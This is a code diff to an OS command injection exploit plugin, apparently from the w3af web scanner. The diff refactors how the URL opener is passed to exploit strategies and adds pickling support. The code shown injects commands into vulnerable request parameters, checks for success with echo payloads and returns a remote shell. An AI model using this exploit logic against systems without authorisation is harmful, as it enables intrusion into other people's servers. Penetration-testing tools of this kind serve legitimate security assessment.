@@ -38,15 +38,14 @@ class ExploitStrategy(object):
     Base class for the different types of exploit strategies that this plugin
     can use to execute commands and get the results.
     '''
-    def __init__(self, vuln, uri_opener):
+    def __init__(self, vuln):
         self._cmd_separator = vuln['separator']
         self._remote_os = vuln['os']
         self.vuln = vuln
-        self.uri_opener = uri_opener
     
-    def send(self, cmd):
+    def send(self, cmd, opener):
         # Lets define the result header and footer.
-        func_ref = getattr(self.uri_opener, self.vuln.get_method())
+        func_ref = getattr(opener, self.vuln.get_method())
         
         exploit_dc = self.vuln.get_dc().copy()
         exploit_dc[self.vuln.get_var()] = cmd
@@ -54,7 +53,7 @@ class ExploitStrategy(object):
         response = func_ref(self.vuln.get_url(), str(exploit_dc))
         return response
                 
-    def can_exploit(self):
+    def can_exploit(self, opener):
         raise NotImplementedError
     
     def generate_command(self, command):
@@ -64,11 +63,11 @@ class ExploitStrategy(object):
         raise NotImplementedError
 
 class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
-    def __init__(self, vuln, uri_opener):
-        ExploitStrategy.__init__(self, vuln, uri_opener)
+    def __init__(self, vuln):
+        ExploitStrategy.__init__(self, vuln)
         CommonAttackMethods.__init__(self)
         
-    def can_exploit(self):
+    def can_exploit(self, opener):
         # Define a test command:
         rand = rand_alpha(8)
         expected_output = rand + '\n'
@@ -79,7 +78,7 @@ class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
             command = self.generate_command('/bin/echo %s' % rand)
 
         # Lets define the result header and footer.
-        http_response = self.send(command)
+        http_response = self.send(command, opener)
         return self._define_exact_cut(http_response.get_body(), expected_output)
         
     def generate_command(self, command):
@@ -103,7 +102,7 @@ class FullPathExploitStrategy(ExploitStrategy):
     REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
                  "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
     
-    def can_exploit(self):
+    def can_exploit(self, opener):
         rand = rand_alpha(8)
         cmd = self.generate_command('echo %s|rev' % rand)
         
@@ -111,7 +110,7 @@ class FullPathExploitStrategy(ExploitStrategy):
         # it reverses, even when I run the echo with "-n".
         expected_output = '%s\n' % rand[::-1]
         
-        http_response = self.send(cmd)
+        http_response = self.send(cmd, opener)
         return expected_output == self.extract_result(http_response)
         
     def generate_command(self, command):
@@ -180,7 +179,8 @@ class os_commanding(AttackPlugin):
         strategy = self._verify_vuln(vuln)
         if strategy:
             # Create the shell object
-            shell_obj = OSCommandingShell(strategy, self.worker_pool)
+            shell_obj = OSCommandingShell(strategy, self._uri_opener,
+                                          self.worker_pool)
             return shell_obj
 
         else:
@@ -194,12 +194,12 @@ class os_commanding(AttackPlugin):
         '''
         for StrategyKlass in self.EXPLOIT_STRATEGIES:
             
-            strategy = StrategyKlass(vuln, self._uri_opener)
+            strategy = StrategyKlass(vuln)
             
             msg = 'Trying to exploit vuln %s using %s.'
             om.out.debug(msg % (vuln.get_id(), strategy))
             
-            if strategy.can_exploit():
+            if strategy.can_exploit(self._uri_opener):
                 om.out.debug('Success with strategy %s.' % strategy)
                 return strategy
         
@@ -224,15 +224,16 @@ class os_commanding(AttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits os commanding vulnerabilities and returns a remote shell.
+        This plugin exploits os commanding vulnerabilities and returns a
+        remote shell.
         '''
 
 
 class OSCommandingShell(ExecShell):
 
-    def __init__(self, strategy, worker_pool):
+    def __init__(self, strategy, uri_opener, worker_pool):
         super(OSCommandingShell, self).__init__(strategy.vuln,
-                                                strategy.uri_opener,
+                                                uri_opener,
                                                 worker_pool)
 
         self.strategy = strategy
@@ -248,7 +249,8 @@ class OSCommandingShell(ExecShell):
         '''
         strategy_cmd = self.strategy.generate_command(command)
         try:
-            http_response = self.strategy.send(strategy_cmd)
+            http_response = self.strategy.send(strategy_cmd,
+                                               self.get_url_opener())
         except w3afException, e:
             msg = 'Error "%s" while sending command to remote host. Please '\
                   'try again.'
@@ -259,3 +261,8 @@ class OSCommandingShell(ExecShell):
     def get_name(self):
         return 'os_commanding'
 
+    def __reduce__(self):
+        '''
+        @see: shell.__reduce__ to understand why this is required.
+        '''
+        return self.__class__, (self.strategy, None, None)
